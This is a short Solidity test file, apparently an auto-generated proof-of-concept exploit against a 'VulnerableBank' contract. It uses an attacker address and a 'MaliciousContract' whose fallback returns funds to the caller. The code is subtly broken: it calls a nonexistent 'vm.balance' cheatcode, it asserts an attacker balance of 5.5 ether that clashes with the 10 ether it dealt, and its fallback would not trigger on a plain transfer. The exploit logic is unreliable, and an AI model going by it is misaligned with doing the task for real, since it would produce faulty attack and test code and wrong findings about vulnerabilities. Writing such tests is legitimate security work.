// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "./basetest.sol";
import "../src/49356772-e930-4cfa-8409-e51abe2c6e55_VulnerableBank.sol";

contract PocTest is BaseTestWithBalanceLog {
    VulnerableBank target;
    address attacker = address(0xBAD);
    address maliciousContract;

    function setUp() public {
        target = new VulnerableBank();
        vm.deal(attacker, 10 ether);

        // Deploy a malicious contract with a fallback function
        maliciousContract = address(new MaliciousContract());
        vm.deal(maliciousContract, 1 ether);
    }

    function testExploit() public balanceLog {
        vm.prank(attacker);
        target.unsafeSend(payable(maliciousContract), 0.5 ether);

        // Check if the attacker's balance increased
        assertEq(vm.balance(attacker), 5 ether + 0.5 ether);
    }
}

contract MaliciousContract {
    receive() external payable {
        // Do nothing on receive, just hold funds
    }

    fallback() external payable {
        // Transfer all funds to the caller (attacker)
        payable(msg.sender).transfer(msg.value);
    }
}